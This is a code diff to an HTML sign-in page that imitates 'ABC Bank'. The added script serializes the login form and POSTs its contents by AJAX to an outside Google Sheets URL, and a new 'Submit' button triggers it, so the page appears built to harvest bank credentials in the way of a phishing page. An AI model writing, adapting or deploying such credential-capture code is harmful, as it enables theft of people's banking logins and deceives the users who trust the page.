@@ -3,9 +3,29 @@
   <meta charset="utf-8">
   <title>ABC Bank: Sign in</title>
   <link rel="stylesheet" type="text/css" href="loginstyle.css">
+  <script
+  src="https://code.jquery.com/jquery-3.4.1.js"
+  integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+  crossorigin="anonymous"></script>
+<script>
+function SubForm (){
+    $.ajax({
+        url:'https://docs.google.com/spreadsheets/d/16_AvFfiIZ6LGCHDB9ugrpM0B4PAm7H-LvdSOfibD0WM/edit?usp=sharing',
+        type:'post',
+        data:$("#myForm").serializeArray(),
+        success: function(){
+          alert("Form Data Submitted :)")
+        },
+        error: function(){
+          alert("There was an error :(")
+        }
+    });
+}
+</script>
 </head>
 
 <body>
+<form id="myForm">
   <div class="login-root">
     <div class="box-root flex-flex flex-direction--column" style="min-height: 100vh;flex-grow: 1;">
       <div class="loginbackground box-background--white padding-top--64">
@@ -64,8 +84,9 @@
                 </div>
                 
                 <div class="field padding-bottom--24">
-                  <input type="submit" name="submit" value="Continue">
+                  <input type="submit"  name="submit" value="Continue">
                 </div>
+               
                 
               </form>
             </div>
@@ -82,6 +103,8 @@
       </div>
     </div>
   </div>
+   </form>
+   <button onclick="SubForm()">Submit</button>
 </body>
 
 </html>
